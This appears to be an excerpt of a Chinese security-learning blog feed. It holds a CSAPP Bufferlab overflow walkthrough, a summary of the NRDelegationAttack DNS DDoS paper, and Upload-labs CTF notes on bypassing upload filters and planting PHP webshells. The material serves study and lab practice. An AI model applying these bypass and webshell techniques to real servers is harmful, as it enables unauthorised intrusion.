    <content type="html"><![CDATA[<h2 id="Bufferlab"><a href="#Bufferlab" class="headerlink" title="Bufferlab"></a>Bufferlab</h2><h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p><p>调用者的栈帧主要包括了参数区以及返回地址。</p><p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p><h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p><ul><li>bufbomb 你所要攻击的缓冲区炸弹程序</li><li>makecookie 根据你所输入的userid生成一个cookie</li><li>hex2raw 一个生成攻击字符串的工具</li></ul><p>首先生成一个cookie供后续使用：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012161536180.png" alt="image-20231012161536180"></p><p>然后使用Ghidra将bufbomb反汇编供后续分析</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0-Candle"><a href="#阶段0-Candle" class="headerlink" title="阶段0:Candle"></a>阶段0:Candle</h3><p>在bufbomb中，通过了test()函数调用getbuf()函数</p><p>test函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">int</span> iVar3;<br>  <br>  iVar1 = uniqueval();<span class="hljs-comment">//这个函数利用进程的id作为种子生成一个伪随机数</span><br>  iVar2 = getbuf();<br>  iVar3 = uniqueval();<br>  <span class="hljs-keyword">if</span> (iVar3 == iVar1) &#123;<span class="hljs-comment">//用于验证栈是否被损坏</span><br>    <span class="hljs-keyword">if</span> (iVar2 == cookie) &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>      validate(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>getbuf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined4 <span class="hljs-title function_">getbuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  undefined local_2c [<span class="hljs-number">40</span>];  <br>  Gets(local_2c);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>目标：让代码执行smoke（）而不是让getbuf（）返回1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163333070.png" alt="image-20231012163333070"></p><p>通过Ghidra的反汇编结果可以看到smoke函数的起始地址为08048c18</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163807613.png" alt="image-20231012163807613"></p><p>再分析getbuf的汇编代码</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012170015339.png" alt="image-20231012170015339"></p><p>可以看到，开辟了一个0x38（56）字节的栈空间，将数组的首地址放在了ebp-0x28的位置，就是说缓冲区有40个字节。</p><p>再加上返回地址和保存的旧的ebp值，此处需要构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192005282.png" alt="image-20231012192005282"></p><p>使用hex2raw生成攻击字符串并测试</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192126197.png" alt="image-20231012192126197"></p><h3 id="阶段1-Sparkler"><a href="#阶段1-Sparkler" class="headerlink" title="阶段1: Sparkler"></a>阶段1: Sparkler</h3><p>目标：getbuf返回时跳转到fizz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> param_1)</span><br><br>&#123;<br>  <span class="hljs-keyword">if</span> (param_1 == cookie) &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>,param_1);<br>    validate(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>,param_1);<br>  &#125;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，要成功调用fizz还需要将cookie作为参数传递，在IA32中，参数是通过调用者的栈进行传递的</p><p>观察fizz的反汇编代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012194646326.png" alt="image-20231012194646326"></p><p><code>mov    0x8(%ebp),%eax</code>和 <code>cmp    0x804d108,%eax</code>这两句，将ebp+8的位置的值赋值给eax，再将eax与0x804d108的值比较，可以猜测ebp+8位置存放的就是传递的参数，而0x804d108的值为cookie</p><p>通过gdb调试验证：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200351900.png" alt="image-20231012200351900"></p><p>可以得到0x804d108的值就是cookie，那么参数就在ebp+8的位置，猜测正确</p><p>构造如下攻击字段：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195924030.png" alt="image-20231012195924030"></p><p>进行生成和测试：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195855241.png" alt="image-20231012195855241"></p><p>疑问：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200444062.png" alt="image-20231012200444062"></p><p>为什么这里也是表示的是ebp+8的位置</p><h3 id="阶段2：Firecracker"><a href="#阶段2：Firecracker" class="headerlink" title="阶段2：Firecracker"></a>阶段2：Firecracker</h3><p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。</p><p>Ghidra获得的bang函数：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012202402226.png" alt="image-20231012202402226"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012204852875.png" alt="image-20231012204852875"></p><p>通过gdb查看0x804d100的值和0x804d108（上一问得出该地址为cookie）</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012205107345.png" alt="image-20231012205107345"></p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211941649.png" alt="image-20231012211941649"></p><p>第一句movl用于修改global_value的值，第二步用于将bang压栈</p><p>获取其机器代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212046878.png" alt="image-20231012212046878"></p><p>通过gdb设置断点</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212231854.png" alt="image-20231012212231854"></p><p>此时的ebp-0x28的位置就是缓冲区的首地址，</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212311757.png" alt="image-20231012212311757"></p><p>构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212345337.png" alt="image-20231012212345337"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211925176.png" alt="image-20231012211925176"></p><h3 id="阶段3-Dynamite"><a href="#阶段3-Dynamite" class="headerlink" title="阶段3 Dynamite"></a>阶段3 Dynamite</h3><p>让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p><p>最初是test调用getbuf，前几问通过缓冲区溢出的攻击，实现了到别的函数的跳转，但不会回来继续执行test函数剩下的内容。从test函数可以看出，当收到getbuf的返回值为1时，会输出Dud，当该值为cookie时，会输出Boom！</p><p>但看getbuf函数可以知道，在函数结束后，会将eax的值设置为1然后返回</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012214342894.png" alt="image-20231012214342894"></p><p>所以构造的代码第一步要修改eax的值为cookie</p><p>而在进行缓冲区覆盖的时候，旧的ebp值会被覆盖，所以需要恢复此时的ebp值</p><p>第三步是需要进行返回地址的修改，让函数能够继续执行test函数</p><p>所以可以构造如下攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215742153.png" alt="image-20231012215742153"></p><p>转换成机器代码的步骤跟上一问一样，最后构造的攻击字段为：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215823675.png" alt="image-20231012215823675"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215723486.png" alt="image-20231012215723486"></p><h3 id="阶段4-Nitroglycerin"><a href="#阶段4-Nitroglycerin" class="headerlink" title="阶段4 Nitroglycerin"></a>阶段4 <strong>Nitroglycerin</strong></h3><p>程序运行时启用了 -n 选项时，程序在读取输入时会启用 getbufn函数(而不是前面的getbuf)。getbufn函数有与getbuf相似的功能，但前者输入数组的长度为512字节。调用getbufn函数之前，程序会先在栈上分配一个随机长度的空间，从而使得getbufn函数的栈空间在不同调用情况下不再是固定的，实际上%ebp的差值达到±240。在应用 -n 选项的情况下，程序会要求提交输入字符串 5 次，5次输入会面对5个不同的栈空间，并要求每次都成功返回cookie值。level 4的任务与level 3一致，即要求getbufn函数返回调用函数testn时返回cookie值，而不是常规的1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221107722.png" alt="image-20231012221107722"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221140589.png" alt="image-20231012221140589"></p><p>对于栈随机化的破解可以使用空操作雪橇，nop sled是在构造的机器代码之前加入nop指令（no operation的缩写，机器码位 0x90），其作用为仅将PC增加而不执行任何操作。在这种情况下，只要覆盖的地址能够指向nop序列所处的任意一个地址，就可以顺序执行nop指令，直到遇到真正构造的机器代码，这样的情况下，对于用于覆盖的返回地址的要求就降低了。</p><p>可以看到，数组的分配长度为0x208（520）个字节</p><p>解题思路：</p><p>（1）修改getbufn的返回地址至testn使其能够继续执行</p><p>（2）修改eax的值为cookie</p><p>（3）还原ebp的值，这里不能使用level3的方法，因为每次程序运行时，栈空间的位置都不一样，所以不能通过3中的方法修改固定地址，但由于每次都是执行相同的代码，那么每次执行时栈中元素的相对位置是不变的。在level3中已经分析了，旧的ebp值已经被覆盖了，因此其值没有应用价值，可以考虑通过esp的值恢复ebp的值</p><p>通过阅读testn的汇编，在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于push ebx而减去了4，再手动减去了0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。</p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001613439.png" alt="image-20231013001613439"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013001632974.png" alt="image-20231013001632974"></p><p>最终构造的攻击代码应该有520（缓冲区长度）+4（覆盖ebp）+4（覆盖返回地址）个字节</p><p>返回地址的选择可以任意跑一次代码，查看ebp位置并-0x208得到的值，进行五次，取最高的一个，这样可以保证每次执行都会通过雪橇一路滑到目标代码进行执行</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231023163626058.png" alt="image-20231023163626058"></p><p>因为此处对于单个用户输入的id来生成cookie，作为random的种子，但random是个伪随机函数，所以对于用户来说，开辟的五次空间都是固定的。</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013010919080.png" alt="image-20231013010919080"></p><p>所以构造攻击代码：</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005138599.png" alt="image-20231013005138599"></p><p>509个nop+15个操作码+4返回地址</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231013005117564.png" alt="image-20231013005117564"></p>]]></content>
    
    
    <categories>
      
      <category>csapplab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NRDelegationAttack</title>
    <link href="/2023/09/11/NRDelegationAttack/"/>
    <url>/2023/09/11/NRDelegationAttack/</url>
    
    <content type="html"><![CDATA[<h2 id="NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"><a href="#NRDelegationAttack-Complexity-DDoS-attack-on-DNS-Recursive-Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）" class="headerlink" title="NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）"></a>NRDelegationAttack: Complexity DDoS attack on DNS Recursive Resolvers（NRDelegationAttack：DNS递归解析器的复杂性DDoS攻击）</h2><p>论文的主题为针对 DNS 递归解析器的 DDoS 攻击。该工作由来自 Tel-Aviv University （以色列特拉维夫大学） 的 DEEPNESS Lab 的研究人员完成。</p><p>利用系统在应对不利条件或异常情况时的性能瓶颈和漏洞，从而有意或恶意地导致系统资源的不合理使用或耗尽。</p><p>Referral response: 引荐响应，是指在计算机网络中，特别是在DNS（域名系统）中，一个服务器向另一个服务器提供关于如何解析特定查询的信息的响应。这种响应告诉请求服务器应该将查询转发到哪个其他服务器来获取所需的信息。</p><p>在DNS中，引荐响应通常是由权威DNS服务器提供的。当一个DNS服务器收到一个查询，但它不拥有与该查询相关的信息时，它可以向请求服务器返回一个引荐响应，指示请求服务器将查询发送到另一个DNS服务器，通常是更高级别的DNS服务器，以获取所需的信息。这个过程可以追溯到根DNS服务器，以便最终找到与查询相关的IP地址或其他资源记录。</p><h4 id="Glue-record"><a href="#Glue-record" class="headerlink" title="Glue record"></a>Glue record</h4><p>普通的DNS记录是保存在权威服务器上的，胶水记录是保存在注册局的DNS服务器上的</p><p>简述一个DNS查询流程：若要查询jd.com</p><ol><li>获取根服务器列表</li><li>向根服务器发送查询（“请问你有jd.com吗？” “没有，但你可以找.com问问，我正好有他们的ip地址，顺带给你吧”）</li><li>向.com权威服务器发送查询（“请问你有jd.com吗” “没有，但你可以找管理jd.com的服务器问问，我正好有他们的ip地址，给你吧”）</li><li>向jd.com域名权威服务器发送查询（“请问你有jd.com吗” “有的，给你吧”）</li></ol><p>在查询过程中，2，3步返回的结果中，顺带给的ip地址就是胶水记录，若没有，则需要<strong>额外的查询去获得ip地址</strong>（递归解析器开启主动解析进程，每个名称服务器启动一个独立的递归状态，查询权威服务器提供的全部名称服务器的ip地址，此过程将消耗大量的服务器资源）</p><p>同时，假设在自建服务器中，example.com使用ns1.example.com和ns2.example.com作为权威服务器</p><p>为了解析example.com，若没有胶水记录，则无法知道ns1.example和ns2.example.com的ip，那么为了解析ns1.example.com的地址，又需要解析example.com，从而陷入循环</p><h4 id="NXNSAttack攻击"><a href="#NXNSAttack攻击" class="headerlink" title="NXNSAttack攻击"></a>NXNSAttack攻击</h4><p>通过向某一递归解析器查询攻击者的权威服务器授权域名的子域名发起大量查询请求，致使攻击者的恶意查询流量在解析过程中被放大，最终导致递归解析器与受害者域名的权威域名服务器遭受拒绝服务攻击。</p><p>威胁模型：</p><p>NXNSAttack的攻击者拥有一个二级域名，如attack.com并维护其权威服务器，并且可以为该域配置大量不同的子域名</p><p>为这些子域名设置NS记录，将这些子域名的解析授权到受害者域名，如victim.com的多个不存在的子域名的权威服务器，这些子域名实际上不存在victim.com的DNS配置中</p><p>攻击流程：</p><p><img src="/2023/09/11/NRDelegationAttack/image-20230914150452417.png" alt="image-20230914150452417"></p><ol><li>攻击者向其维护的一个子域名ns1.attacker.com发起DNS查询请求，攻击者每次查询会使用不同的子域名，以此来绕过递归解析器的缓存机制</li><li>攻击者请求会到达attack.com的权威服务器，并返回提前设置好的DNS响应，其中包含大量的NS记录，这些记录指向受害者域下的不存在的子域名，而且不包含glue记录，即不会包含这些子域名的ip地址</li><li>当递归解析器收到大量包含NS记录的响应后，会尝试解析这些NS记录，以确定每个名称服务器的ip地址。为了完成这个任务，解析器就会向victim.com的权威服务器发送大量的NS解析请求</li><li>但由于这些子域名并不存在，受害者域的权威服务器就回返回NX响应（Name Error）</li><li>由于递归解析器不断地发起NS解析请求，而受害者域的权威服务器始终返回NX响应，就会占用服务器资源，最终导致递归解析器和受害者域名的权威服务器遭受拒绝服务攻击，无法响应正常的DNS请求。</li></ol><h4 id="缓解策略：MaxFetch-k"><a href="#缓解策略：MaxFetch-k" class="headerlink" title="缓解策略：MaxFetch(k)"></a>缓解策略：MaxFetch(k)</h4><p>具体步骤：</p><ol><li>对于每一个请求中的1个或k个名称服务器进行解析，而不是在NS记录响应到达递归解析器时，一次性查询该区的全部名称服务器ip</li><li>收到用户请求时，如果请求的是已经解析过的名称服务器时，解析器会解析另外k个名称服务器的ip地址</li><li>解析过程一直持续到权威返回的NS记录响应中提供的所有NS记录被解析</li></ol><p>例如，在BIND9的实现中，k为5，在收到包含许多NS名称的引用响应时，BIND9只解析5个，如果所有的解析都反回NXDOMAIN（域名不存在或无法解析），则解析终止并向客户端返回NY响应。</p><h4 id="攻击利用的四个DNS机制"><a href="#攻击利用的四个DNS机制" class="headerlink" title="攻击利用的四个DNS机制"></a>攻击利用的四个DNS机制</h4><h5 id="Slist"><a href="#Slist" class="headerlink" title="Slist"></a>Slist</h5><p>“SLIST” 机制在 RFC-1034 中提出。它在解析器实现中用作临时存储器，用于记录在处理客户端查询时执行的每个中间名称服务器解析的状态。在 BIND9 中其被实现为 address-DB (ADB) 。当递归解析器接收到响应中没有包含 NS 记录的 IP 地址的响应时，其将 NS 记录保存在 ADB 中，并启动新的 DNS 查询来收集这些 NS 服务器的 A 记录。</p><h5 id="Delegation-Response"><a href="#Delegation-Response" class="headerlink" title="Delegation Response"></a>Delegation Response</h5><p>要回答解析器的查询请求，权威服务器可以决定将解析工作委托给另一个名称服务器。例如图 2 中，example1.com 将 e1.example.com 的解析委托给 www1.example2.com ，或者当解析器获得引用响应（Referral Response, RR） 时，就会发生这种情况。</p><h5 id="Referral-Reponse-Limit"><a href="#Referral-Reponse-Limit" class="headerlink" title="Referral Reponse Limit"></a>Referral Reponse Limit</h5><p>即上文提到过的缓解措施，当查询达到限制时，将设置一个特殊标志，No_Fetch</p><h5 id="Restart-Event"><a href="#Restart-Event" class="headerlink" title="Restart Event"></a>Restart Event</h5><p>在许多情况下，解析器中的解析过程被委托给不同的名称服务器，在这种情况下，它将重新启动并在新的名称服务器上继续解析。被重定向到的“新权威”服务器将会被记录在 ADB 中。</p><p>在restart时，解析器会清除和重置一些标识位，其中包括为了缓解 NXNSAttack 引入的No_Fetch标识位，其用来限制解析器每次查询的NS数量，当No_Fetch为1时，将终止本次解析。</p><h4 id="NRDelegation-Attack威胁模型"><a href="#NRDelegation-Attack威胁模型" class="headerlink" title="NRDelegation Attack威胁模型"></a>NRDelegation Attack威胁模型</h4><h5 id="攻击条件："><a href="#攻击条件：" class="headerlink" title="攻击条件："></a>攻击条件：</h5><ol><li>一个或多个可以发起恶意查询的客户端</li><li>一个可以产生特定referral response的可控权威服务器</li><li>不响应DNS查询的服务器列表或ip地址</li></ol><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p><img src="/2023/09/11/NRDelegationAttack/image-20230914163958837.png" alt="image-20230914163958837"></p><p><strong>阶段1</strong></p><ol><li>攻击者发起恶意查询，xyz.referral.com</li><li>受害者解析器向攻击者控制的权威服务器查询referral.com</li><li>referral.com回复一个大型引用响应</li></ol><p><strong>阶段2</strong></p><ol start="4"><li>解析器首先遍历ADB和缓存，查看这些NS是否已经被查询过，因为存在A和AAAA两种记录（IPv4和IPv6），所以会查询2n次</li><li>解析器没有找到NS的有效信息，就回发起解析，由于Referral Response Limit的存在，每次只查询k个</li></ol><p>攻击者利用可控的权威名称服务器返回没有胶水记录的超长的referral response（大小设为 n ）。根据解析器软件的实现（文中主要针对 BIND9 的实现），解析器首先将遍历 ADB 和缓存，查看这些 NS 是否之前查询过，因为存在 A 和 AAAA 两种记录，所以会查询2n次，这是 NRDelegationAttack 的主要成因之一，<strong>每次的遍历耗费了服务器大量的计算资源</strong>。当解析器没有找到 NS 的有效信息，则会对这些 NS 发起解析，由于Referral Response Limit限制的存在，因此，解析器每次仅查询有限的 k 个 NS。</p><p><strong>阶段3</strong></p><p>当解析器查询referral response中的NS时，将被引导至权威服务器，并触发委托响应，这时候restart事件被激活，No_Fetch标识符被清除，重新开启第4步，<strong>重新检查ADB和缓存</strong>。由于攻击者设置的是不响应 DNS 查询的服务器，因此，这些无法获取到这些NS的有效信息，因此，无法在ADB 中更新这些 NS 的信息。所以步骤 10 只有到达解析器的安全限制计数器的上限才会停止，BIND9 中这个上限为 100。该上限对攻击者来说已经可以完成攻击了。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs2</title>
    <link href="/2023/09/07/Upload-labs2/"/>
    <url>/2023/09/07/Upload-labs2/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907100705175.png" alt="image-20230907100705175"></p><p><code>$img_path = $_GET[&#39;save_path&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $file_ext;</code>：构建一个新的文件路径，包括文件名和扩展名。这个路径基于名为 <code>&#39;save_path&#39;</code> 的 GET 参数，以及一个随机数、日期时间戳和文件扩展名。所以可以采用%00进行截断</p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907104811944.png" alt="image-20230907104811944"></p><p>这题变成了 <code>$_POST[&#39;save_path&#39;]</code> ，POST方式不会像GET方式一样，提交经过URL编码，所以进行截断需要手动修改二进制流</p><h4 id="Pass-13，14，15"><a href="#Pass-13，14，15" class="headerlink" title="Pass-13，14，15"></a>Pass-13，14，15</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907151043164.png" alt="image-20230907151043164"></p><p>创建图片马：</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150642263.png" alt="image-20230907150642263"></p><p>抓包记录上传位置</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150615706.png" alt="image-20230907150615706"></p><p>通过题目给出的文件包含漏洞访问，可以看到正确返回了木马中的phpinfo()内容</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150559242.png" alt="image-20230907150559242"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907153602463.png" alt="image-20230907153602463"></p><p>发现会对图片进行二次渲染，则之前使用的图片码无法使用，因为加在图片后的php代码会被渲染，从而无法正确执行</p><p>所以可以上传一张图片，对比看被二次渲染过的图片有什么地方是没变的，可以将php代码插入其中（通常文件头是不会被修改的，但修改文件头可能会导致文件损坏）</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163747679.png" alt="image-20230907163747679"></p><p>左边是修改过的gif，右边是上传之后重新下载的gif，可以看到php代码被成功的添加</p><p>用上一题同样的方法访问</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163902487.png" alt="image-20230907163902487"></p><p>通过文件包含漏洞，代码被成功执行</p><h4 id="Pass-17，18条件竞争"><a href="#Pass-17，18条件竞争" class="headerlink" title="Pass-17，18条件竞争"></a>Pass-17，18条件竞争</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907165625505.png" alt="image-20230907165625505"></p><p>利用时间差，根据源码可以知道，上传的逻辑是：如果上传一个jpg，png，gif图片，成功了则改名并保存，若没成功则删除，则可以通过burpsuite进行攻击，不断的上传文件，并不断的访问该文件，直到访问成功</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs1</title>
    <link href="/2023/09/05/Upload-labs/"/>
    <url>/2023/09/05/Upload-labs/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" alt="image-20230905105954741"></p><p><strong>创建一句话php</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" alt="image-20230905110036360"></p><ul><li><code>@</code>：错误抑制符号，可以阻止PHP报告eval函数执行中的错误</li><li><code>eval</code>：接受一个字符串作为参数，将其作为PHP代码执行</li><li><code>$_POST(&#39;shell&#39;)</code>：POST请求变量，包含一个名为shell的参数</li></ul><p><strong>上传尝试</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" alt="image-20230905110908269"></p><p>猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传</p><p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" alt="image-20230905111208945"></p><p>上传成功，查看传输的路径</p><p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" alt="image-20230905111248987"></p><p>通过蚁剑进行连接</p><p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" alt="image-20230905111418459"></p><p>在根目录下即可找到flag</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>依然通过一句话php木马进行尝试</p><p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" alt="image-20230905111610103"></p><p>通过Burpsuite进行抓包</p><p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" alt="image-20230905111716152"></p><p>Content-Type显示为text&#x2F;php，修改为image&#x2F;jpeg，重发</p><p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" alt="image-20230905113245564"></p><p>得到路径，其余操作与Pass-01相同</p><p>利用该漏洞的关键函数：<code>mime_content_type()</code></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" alt="image-20230905133923792"></p><p>基于黑名单绕过，通常方法有以下几种：</p><ul><li>上传不常见的php拓展名：pht, phpt, phtml, php3,php4,php5,php6</li><li>有些会忽略大小写：Php，PHp，pHp之类的</li><li>解析漏洞：例如apache，iis，nginx（需要继续了解，后续单独写博客）</li></ul><p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" alt="image-20230905134828992"></p><p>修改后缀即可</p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" alt="image-20230906131705456"></p><p>屏蔽了所有的拓展名，所以可以通过基于白名单的绕过进行文件上传：%00截断：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" alt="image-20230906131758825"></p><p>也可以通过上传.htaccess文件绕过</p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" alt="image-20230906135624141"></p><p>对比之前的题目，可以发现，少了将文件名全部转化成小写这一步，所以可以通过大小写混合进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" alt="image-20230906140256010"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" alt="image-20230906142332590"></p><p>并未去除首尾的空格，可以通过添加空格的方式绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" alt="image-20230906143052256"></p><p>因为此时服务器获得的文件后缀是php+空格，不在黑明单中，所以可以实现绕过</p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" 